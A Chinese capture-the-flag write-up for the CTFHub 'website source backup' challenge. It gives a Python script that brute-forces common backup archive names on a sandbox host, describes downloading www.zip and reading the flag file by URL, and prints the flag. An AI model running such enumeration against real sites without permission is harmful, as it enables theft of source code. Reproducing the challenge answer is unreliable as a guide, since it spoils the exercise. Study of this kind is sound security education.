1. 题目信息

  • 平台：CTFHub

  • 题目名称：网站源码
  • 提示：常见的网站源码备份文件后缀（.tar, .tar.gz, .zip, .rar）及常见文件名（web, website, backup, back, www, wwwroot, temp）

2. 解题思路

题目提示开发人员在线上环境对源代码进行了备份，并且放在了 web 目录下。可以通过拼接常见的备份文件名尝试下载网站源码包。下载后，直接寻找带有 flag 字样的可疑文件，或利用代码编辑器进行全局搜索，进而找到 Flag。

3. 操作步骤（包含真实试错）

第一步：手写 Python 脚本进行目录爆破

题目页面直接给出了字典。利用 Python 的 requests 库编写简单的脚本，将前缀与后缀进行笛卡尔积组合，遍历请求。核心逻辑在于判断返回状态码为 200 且响应内容大于 1000 字节（过滤掉 404 页面）。

import requests

base_url = "http://challenge-ec6fcb215569b74.sandbox.ctfhub.com:10800/"
names = ["web", "website", "backup", "back", "www", "wwwroot", "temp"]
exts = [".tar", ".tar.gz", ".zip", ".rar"]

for name in names:
    for ext in exts:
        filename = name + ext
        url = base_url + filename
        try:
            response = requests.get(url, timeout=3, allow_redirects=False)
            if response.status_code == 200 and len(response.content) > 1000:
                print(f"[+] 发现潜在备份文件: {filename}")
                print(f"    下载链接: {url}")
        except Exception as e:
            pass

脚本成功爆破出备份文件 www.zip。

第二步：源码审计与“直觉嗅探”

在浏览器下载并解压 www.zip。解压后的文件夹（www）包含三个文件：50x.html、index.html 以及一个带有随机字符的 flag_2968724941.txt。比起在代码里全局搜索，直接看文件名，带有 flag 的文件立刻吸引了注意力。

注：直接双击该 txt 文件，内容写着“where is flag ??”（障眼法）。但在浏览器中直接访问该文件 URL，却直接吐出了真实的 Flag。

第三步：获取 Flag（成功）

直接通过浏览器访问 http://.../flag_2968724941.txt，页面直接显示 Flag：

ctfhub{62c445bd449418def3f477f}

提交成功，系统提示获得 10 点经验及 50 金币。

4. 踩坑记录与复盘

  • 源码包里的“障眼法”：文本文件中写着“where is flag ??”，是一个典型的嘲讽干扰项。但要知道，服务器上的文件路径本身就是敏感的。攻击者可以通过直接 URL 访问获取文件内容，而不是仅仅依赖本地解压后的文本内容。
  • 培养“目标嗅觉”：在渗透测试中，带着目标导向去审视文件比盲目全局搜索更高效。文件名带 flag、backup、admin 等，永远是第一优先级排查对象。这次跳过全局搜索直接命中，说明形成了很好的安全直觉。

5. 知识总结

  • 备份文件泄露漏洞：开发人员常将 www.zip、backup.tar.gz 等源码包留在网站根目录。攻击者可以通过字典爆破后缀和前缀直接下载整个网站源码，这是一类极为致命的敏感信息泄露。
  • Python 脚本自动化：面对重复性的请求排查，使用 Python 的 requests 库编写循环脚本，远比手动尝试或图形化工具更轻量、快捷。
  • 文件名指纹：在源码审计初步阶段，除了全局内容搜索，文件名本身也是极强的线索来源。攻击者常能从文件名中直接推断出敏感内容所在位置。
